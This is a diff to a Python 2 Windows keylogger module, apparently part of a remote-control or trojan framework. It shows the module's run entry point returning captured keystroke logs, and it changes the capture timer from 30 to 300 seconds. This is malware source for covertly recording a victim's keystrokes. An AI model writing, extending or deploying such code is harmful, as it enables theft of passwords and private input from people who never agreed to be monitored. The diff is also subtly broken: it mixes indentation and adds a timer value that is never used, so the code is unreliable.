@@ -13,7 +13,7 @@ kernel32 = windll.kernel32
 psapi    = windll.psapi
 current_window = None
 main_thread_id = win32api.GetCurrentThreadId()
-
+timer 	= 0
 user_info = getpass.getuser()
 
 logger = ""
@@ -21,10 +21,11 @@ logger = ""
 def run(**args):
         print "[*] In keylogger mod"
 
+		timer = float(args['tm'])
+
         #start keylogger for a time period
         startLog()
 
-        print "Helloooo"
         return logger
 
 def on_timer():
@@ -111,7 +112,7 @@ def startLog():
         logger += str((time.strftime("%d/%m/%Y - %H:%M:%S")))
         logger += "\n"
 
-        t = Timer(30.0, on_timer) # Quit after 5 seconds
+        t = Timer(300, on_timer) # Quit after 300 (5 minutes) seconds
         t.start()
 
         # create and register a hook manager 
